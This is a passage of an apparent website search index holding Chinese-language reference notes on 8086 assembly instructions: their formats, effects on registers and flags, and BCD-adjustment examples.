fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d pop \u6307\u4ee4\u683c\u5f0f \uff1apop a \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u6808\u4e0a\u5f39\u51fa 16 \u4f4d\u6570\u503c\u5230 a \u4e2d\uff0c\u5373 a = word ptr ss:[sp], sp = sp + 2 \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f cs fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d xchg \u6307\u4ee4\u683c\u5f0f \uff1axchg op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ea4\u6362 op1 op2\uff0c\u5373 tmp = op1, op1 = op2, op2 = tmp \u6ce8\u610f \uff1aop1 op2 \u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\uff0c\u4e0d\u80fd\u90fd\u662f\u5185\u5b58\uff0c\u4e14\u4e0d\u80fd\u662f\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d","title":"\u901a\u7528\u6570\u636e\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_8","text":"in \u6307\u4ee4\u683c\u5f0f \uff1ain acc, port \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u7aef\u53e3\u8bfb\u6570\u636e\u5230 al \u6216 ax \u4e2d\uff0c\u5373 acc = [port]\uff08\u7aef\u53e3\u4e2d\u5185\u5bb9\uff09 \u6ce8\u610f \uff1aacc \u4e00\u5b9a\u662f al \u6216 ax\uff0cport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u6700\u5927 0FFh\u3002\u662f ax \u5219 [port] \u5b58\u5165 al\uff0c[port+1] \u5b58\u5165 ah out \u6307\u4ee4\u683c\u5f0f \uff1aout port, acc \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a al \u6216 ax \u4e2d\u503c\u5199\u5165\u7aef\u53e3\uff0c\u5373 [port] = acc \u6ce8\u610f \uff1aport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff08\u7acb\u5373\u6570\u6700\u5927 0FFh\uff09\uff0cacc \u4e00\u5b9a\u662f al \u6216 ax\u3002\u662f ax \u5219 al \u5199\u5165 [port]\uff0cah \u5199\u5165 [port+1]","title":"\u7aef\u53e3\u8f93\u5165\u8f93\u51fa\u6307\u4ee4"},{"location":"cs/pl/asm/#_9","text":"lea \u6307\u4ee4\u683c\u5f0f \uff1alea dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u7684\u6709\u6548\u5730\u5740\u4f20\u5165 dest\uff0c\u5373 dest = offset src \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5185\u5b58\u53d8\u91cf\u3002\u53d6 src \u7684\u504f\u79fb\u5730\u5740 lds \u6307\u4ee4\u683c\u5f0f \uff1alds dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ds:dest\uff0c\u5373 dest = word ptr [src], ds = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58 les \u6307\u4ee4\u683c\u5f0f \uff1ales dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 es:dest\uff0c\u5373 dest = word ptr [src], es = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58","title":"\u5730\u5740\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_10","text":"lahf \u6307\u4ee4\u683c\u5f0f \uff1alahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u4f4e 8 \u4f4d\u590d\u5236\u5230 ah\uff0c\u5373 ah = fl & 0FFh sahf \u6307\u4ee4\u683c\u5f0f \uff1asahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ah \u5b58\u5165 fl \u4f4e 8 \u4f4d\uff0c\u5373 fl = (fl & 0FF00h) | 2 | (ah & 0D5h) \u6ce8\u610f \uff1a\u53ea\u4fdd\u7559 ah \u7684 0 2 4 6 7 \u4f4d\uff08cf pf af zf sf\uff09\uff0c\u4e14\u7b2c 1 \u4f4d\u6052\u4e3a 1 OF DF IF TF SF ZF AF PF CF pushf \u6307\u4ee4\u683c\u5f0f \uff1apushf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u538b\u5165\u5806\u6808\uff0c\u5373 push fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\uff09 popf \u6307\u4ee4\u683c\u5f0f \uff1apopf \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa 16 \u4f4d\u5230 fl\uff0c\u5373 pop fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c OF DF IF TF SF ZF AF PF CF","title":"\u6807\u5fd7\u5bc4\u5b58\u5668\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_11","text":"","title":"\u8f6c\u6362\u6307\u4ee4"},{"location":"cs/pl/asm/#_12","text":"cbw \u6307\u4ee4\u683c\u5f0f \uff1acbw \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57\u8282 al \u6269\u5145\u4e3a\u5b57 ax\uff0c\u5373\u5c06 al \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 ah cwd \u6307\u4ee4\u683c\u5f0f \uff1acwd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57 ax \u6269\u5145\u4e3a\u53cc\u5b57 dx:ax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 ax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 dx xlat \u6307\u4ee4\u683c\u5f0f \uff1axlat \u6307\u4ee4\u4f5c\u7528 \uff1a\u6362\u7801\u6307\u4ee4\uff0cal = byte ptr ds:[bx+al] \u6ce8\u610f \uff1a\u4e00\u822c\u4f7f ds:bx \u6307\u5411\u4e00\u5f20\u8868\uff0c\u7136\u540e\u529f\u80fd\u5373\u7c7b\u4f3c\u5217\u8868\u7d22\u5f15\u53d6\u503c","title":"\u7b26\u53f7\u6269\u5145\u6307\u4ee4"},{"location":"cs/pl/asm/#_13","text":"","title":"\u7b97\u6570\u6307\u4ee4"},{"location":"cs/pl/asm/#_14","text":"add \u6307\u4ee4\u683c\u5f0f \uff1aadd dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u52a0\u5230 dest \u4e0a\uff0c\u5373 dest += src \u6ce8\u610f \uff1asrc \u53ef\u4ee5\u662f\u7acb\u5373\u6570/\u5bc4\u5b58\u5668/\u5185\u5b58\uff0cdest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668/\u5185\u5b58\uff0c\u4f46\u4e8c\u8005\u4e0d\u80fd\u90fd\u4e3a\u5185\u5b58\uff0c\u5bbd\u5ea6\u8981\u4e00\u81f4\u3002\u53ef\u80fd\u4f1a\u4ea7\u751f\u8fdb\u4f4d\uff08cf\uff09\u548c\u6ea2\u51fa\uff08of\uff09 OF DF IF TF SF ZF AF PF CF inc \u6307\u4ee4\u683c\u5f0f \uff1ainc op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u52a0\u4e00\uff0c\u5373 op += 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF adc \u6307\u4ee4\u683c\u5f0f \uff1aadc dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u52a0\uff0c\u5373 dest = dest + src + cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u89c4\u5219\u4e0e add \u76f8\u540c\uff0c\u53ef\u4ee5\u7528\u4e8e\u6a21\u62df 32 \u4f4d\u52a0\u6cd5 OF DF IF TF SF ZF AF PF CF","title":"\u52a0\u6cd5\u6307\u4ee4"},{"location":"cs/pl/asm/#_15","text":"sub \u6307\u4ee4\u683c\u5f0f \uff1asub dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece dest \u51cf\u53bb src\uff0c\u5373 dest -= src \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0c\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff08of\uff09\uff0c\u501f\u4f4d\u4e5f\u4f1a\u4f7f cf \u53d8 1 OF DF IF TF SF ZF AF PF CF sbb \u6307\u4ee4\u683c\u5f0f \uff1asbb dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u501f\u4f4d\u51cf\uff0cdest = dest - src - cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add OF DF IF TF SF ZF AF PF CF dec \u6307\u4ee4\u683c\u5f0f \uff1adec op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u51cf\u4e00\uff0c\u5373 op -= 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF neg \u6307\u4ee4\u683c\u5f0f \uff1aneg op \u6307\u4ee4\u4f5c\u7528 \uff1aop = -op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u975e\u96f6\u6570\u6c42\u8865\u540e cf=1\uff0c0 \u6c42\u8865\u540e cf=0 OF DF IF TF SF ZF AF PF CF cmp \u6307\u4ee4\u683c\u5f0f \uff1acmp op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u7528 op1 \u51cf op2\uff0c\u4f46\u4e22\u5f03\u7ed3\u679c\u53ea\u5f71\u54cd\u6807\u5fd7\u4f4d \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c sub\uff0c\u7528\u4e8e\u5728 jump \u6307\u4ee4\u524d\u7ed9\u51fa\u7b26\u53f7\u4f4d\u4f5c\u4e3a\u6761\u4ef6\u5224\u65ad\u4f9d\u636e\u3002 OF DF IF TF SF ZF AF PF CF","title":"\u51cf\u6cd5\u6307\u4ee4"},{"location":"cs/pl/asm/#_16","text":"mul \u6307\u4ee4\u683c\u5f0f \uff1amul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u975e\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u5f53 src \u4e3a 8 \u4f4d\u65f6 ax = al * src\uff0c\u5f53 src \u4e3a 16 \u4f4d\u65f6 dx:ax = ax * src \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u5982\u679c\u9ad8\u4f4d\uff08\u4e00\u534a\uff09\u662f 0\uff0c\u5219\u5c06 of cf \u7f6e 0\uff0c\u5426\u5219\u7f6e 1 OF DF IF TF SF ZF AF PF CF imul \u6307\u4ee4\u683c\u5f0f \uff1aimul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u4e58\u6cd5\u65b9\u5f0f\u540c mul\uff0c\u4f46\u5c06\u4e24\u4e2a\u4e58\u6570\u548c\u79ef\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF","title":"\u4e58\u6cd5\u6307\u4ee4"},{"location":"cs/pl/asm/#_17","text":"div \u6307\u4ee4\u683c\u5f0f \uff1adiv op \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u7b26\u53f7\u6570\u9664\u6cd5 \u5f53 op \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / op, ah = ax % op \u5f53 op \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / op, dx = dx:ax % op \u6ce8\u610f \uff1aop \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u53ef\u4ee5\u5f97\u5230\u5546\u548c\u4f59\u6570 OF DF IF TF SF ZF AF PF CF idiv \u6307\u4ee4\u683c\u5f0f \uff1aidiv \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u9664\u6cd5\uff0c\u9664\u6cd5\u64cd\u4f5c\u540c div\uff0c\u4f46\u5c06\u9664\u6570\u3001\u88ab\u9664\u6570\u3001\u5546\u548c\u4f59\u6570\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF","title":"\u9664\u6cd5\u6307\u4ee4"},{"location":"cs/pl/asm/#_18","text":"and \u6307\u4ee4\u683c\u5f0f \uff1aand dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u4e0e\u8fd0\u7b97\uff0cdest = dest & src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF or \u6307\u4ee4\u683c\u5f0f \uff1aor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u6216\u8fd0\u7b97\uff0cdest = dest | src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF xor \u6307\u4ee4\u683c\u5f0f \uff1axor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u5f02\u6216\u8fd0\u7b97\uff0cdest = dest ^ src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF not \u6307\u4ee4\u683c\u5f0f \uff1anot op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 op \u6309\u4f4d\u6c42\u53cd\uff0cop = ~op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58 test \u6307\u4ee4\u683c\u5f0f \uff1atest op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4d\u6d4b\u8bd5\uff0cop1 & op2 \u4e22\u5f03\u7ed3\u679c\u4ec5\u5f71\u54cd\u7b26\u53f7\u4f4d \u6ce8\u610f \uff1a\u4e3b\u8981\u7528\u5230 zf \u7684\u53d8\u5316\uff0c\u4e3a jz jnz \u63d0\u4f9b zf OF DF IF TF SF ZF AF PF CF","title":"\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4"},{"location":"cs/pl/asm/#_19","text":"shl \u6307\u4ee4\u683c\u5f0f \uff1ashl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u5de6\u79fb count \u4f4d\uff0c\u53f3\u4fa7\u8865 0\uff0c\u5de6\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF shr \u6307\u4ee4\u683c\u5f0f \uff1ashr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sal \u6307\u4ee4\u683c\u5f0f \uff1asal dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u5de6\u79fb count \u4f4d\uff0c\u540c\u903b\u8f91\u5de6\u79fb \u6ce8\u610f \uff1a\u4e0e shl \u5b8c\u5168\u76f8\u540c \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sar \u6307\u4ee4\u683c\u5f0f \uff1asar dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF rol \u6307\u4ee4\u683c\u5f0f \uff1arol dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u5de6\u79fb count \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF ror \u6307\u4ee4\u683c\u5f0f \uff1aror dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u53f3\u79fb count \u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcl \u6307\u4ee4\u683c\u5f0f \uff1arcl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcr \u6307\u4ee4\u683c\u5f0f \uff1arcr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF","title":"\u79fb\u4f4d\u6307\u4ee4"},{"location":"cs/pl/asm/#_20","text":"BCD \u7801\u662f\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u5341\u8fdb\u5236\u6570\uff0c\u53ef\u4ee5\u5206\u4e3a\u538b\u7f29 BCD \u7801\u548c\u975e\u538b\u7f29 BCD \u7801","title":"\u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4"},{"location":"cs/pl/asm/#bcd","text":"\u538b\u7f29 BCD \u7801\u5373\u662f\u4f7f\u7528 4 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u5982 37h \u8868\u793a 37\u3002\u4e0e\u8fd9\u4e9b\u6307\u4ee4\u76f8\u5173\u7684\u662f af \u6807\u5fd7\uff0c\u5b83\u5728\u52a0\u51cf\u6cd5\u65f6\u5982\u679c\u4f4e\u56db\u4f4d\u548c\u9ad8\u56db\u4f4d\u95f4\u53d1\u751f\u4e86\u5341\u516d\u8fdb\u5236\u8fdb\u4f4d\u5219\u53d8\u4e3a 1\u3002\u56e0\u6b64\u4e5f\u4f1a\u6b63\u597d\u5dee 6\uff0cdaa das \u4f5c\u7528\u5219\u662f\u5c06\u8fd9\u4e2a 6 \u8c03\u6574\u56de\u6765\uff0c\u4f7f\u7ed3\u679c\u7ee7\u7eed\u4e3a\u538b\u7f29 BCD \u7801 daa \u6307\u4ee4\u683c\u5f0f \uff1adaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al += 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al += 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF das \u6307\u4ee4\u683c\u5f0f \uff1adas \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al -= 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al -= 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF","title":"\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4"},{"location":"cs/pl/asm/#bcd_1","text":"\u975e\u538b\u7f29 BCD \u7801\u4f7f\u7528 8 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u4f4d\uff0c\u5176\u4e2d\u9ad8 4 \u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u6bd4\u5982 06h 16h 26h \u5747\u8868\u793a\u5341\u8fdb\u5236\u6570 6 aaa \u6307\u4ee4\u683c\u5f0f \uff1aaaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u52a0\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (al&0Fh) > 9) al = (al+6)&0Fh, ah += 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ah , 0 mov al , ' 8 ' ; al = 38h add al , ' 9 ' ; al = 38h + 39h = 71h, af = 1, cf = 0 aaa ; ax = 0107h \u5373 17 mov ax , 0505 h ; 55 add al , 9 ; al = 0Eh, af = 0, cf = 0 aaa ; ax = 0604h \u5373 64 aas \u6307\u4ee4\u683c\u5f0f \uff1aaas \u6307\u4ee4\u4f5c\u7528 \uff1a\u51cf\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (af&0Fh) > 9) al = (al-6)&0Fh, ah -= 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0201 h ; 21 sub al , 9 ; al = 0F8h, af = 1, cf = 1 aas ; ax = 0102h \u5373 12 mov ax , 0335 h ; 35 sub al , 38 h ; (\u51cf 8) al = 0FDh, af = 1, cf = 1 aas ; ax = 0207h \u5373 27 aam \u6307\u4ee4\u683c\u5f0f \uff1aaam \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e58\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u4e58\u6cd5\u540e\u5bf9\u5176\u505a\u8c03\u6574 ah = al / 10, al = al % 10 OF DF IF TF SF ZF AF PF CF \u4f8b mov al , 3 mov bl , 4 mul bl ; ax = 000Ch aam ; ax = 0102h \u5373 12 aad \u6307\u4ee4\u683c\u5f0f \uff1aaad \u6307\u4ee4\u4f5c\u7528 \uff1a\u9664\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 ax \u88ab\u505a\u9664\u6cd5 \u524d \u5bf9\u5176\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u9664\u6cd5\u7ed3\u679c\u4e3a BCD \u7801 al = ah * 10 + al, ah = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0105 h ; 15 mov cl , 4 aad ; ax = 000Fh div cl ; al = 03h, ah = 03h","title":"\u975e\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4"},{"location":"cs/pl/asm/#_21","text":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5206\u4e3a movs \u5b57\u7b26\u4e32\u4f20\u9001\u3001cmps \u5b57\u7b26\u4e32\u6bd4\u8f83\u3001scas \u5b57\u7b26\u4e32\u626b\u63cf\u3001stos \u5b58\u5165\u5b57\u7b26\u4e32\u3001lods 